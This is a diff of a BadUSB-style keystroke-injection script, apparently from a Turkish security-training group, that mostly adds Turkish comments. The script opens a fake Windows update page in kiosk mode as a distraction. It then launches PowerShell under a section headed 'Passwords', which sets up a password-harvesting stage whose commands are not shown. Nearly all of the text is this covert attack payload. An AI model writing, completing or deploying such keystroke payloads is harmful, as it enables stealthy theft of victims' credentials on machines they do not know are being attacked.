@@ -1,19 +1,19 @@
 // @KekikAkademi Edit ~
 delay(500);
-press("ALT SHIFT");
+press("ALT SHIFT"); // Yerel Klavye Düzeni Değiştiriliyor
 delay(500);
 // @KekikAkademi Edit #
 
 // Fake Update Sayfası Açılıyor
-layout("US"); // US keyboard layout
-typingSpeed(0,0);	//fast
+layout("US"); // US Klavye Düzeni Seçiyor
+typingSpeed(0,0); // Hızlı Yazması İçin
 press("GUI R");
 delay(500);
 type("iexplore -k http://fakeupdate.net/win10u/index.html\n")
 delay(500);
 
 // Şifreler
-press("WIN");
+press("WIN"); // Başlat
 delay(500);
 type("powershell");
 delay(500);
@@ -41,6 +41,6 @@ press("ALT F4");
 
 // @KekikAkademi Edit ~
 delay(500);
-press("ALT SHIFT");
+press("ALT SHIFT"); // Yerel Klavye Düzeni Değiştiriliyor
 delay(500);
 // @KekikAkademi Edit #
